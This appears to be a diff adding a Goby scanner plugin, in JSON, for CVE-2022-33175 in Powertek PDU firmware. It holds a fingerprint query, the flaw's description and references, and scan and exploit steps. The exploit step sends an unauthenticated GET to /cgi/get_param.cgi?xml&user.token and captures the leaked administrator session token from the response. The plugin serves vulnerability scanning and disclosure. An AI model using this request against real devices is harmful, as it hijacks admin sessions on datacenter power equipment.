@@ -1,0 +1,112 @@
+{
+      "Name": "Powertek Firmware Authenticated Session Token Leak CVE-2022-33175",
+      "Level": "2",
+      "Tags": [
+            "infoleak"
+      ],
+      "GobyQuery": "title=\"Powertek\"",
+      "Description": "Powertek is a company that makes datacenter class smart PDUs (Power Distribution Units - i.e. heavy duty power cords) for server racks.",
+      "Product": "Powertek Firmware",
+      "Homepage": "https://www.powertekpdus.com/",
+      "Author": "",
+      "Impact": "Power Distribution Units running on Powertek firmware (multiple brands) before 3.30.30 have an insecure permissions setting on the user.token field that is accessible to everyone through the /cgi/get_param.cgi HTTP API. This leads to disclosing active session ids of currently logged-in administrators. The session id can then be reused to act as the administrator, allowing reading of the cleartext password, or reconfiguring the device.",
+      "Recommendation": "https://www.powertekpdus.com/resources/firmware-downloads",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2022-33175",
+            "https://gynvael.coldwind.pl/?lang=en&id=748"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi/get_param.cgi?xml&user.token",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "token",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "xml",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/cgi/get_param.cgi?xml&user.token",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "token",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$head",
+                                    "operation": "contains",
+                                    "value": "xml",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|concat|"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
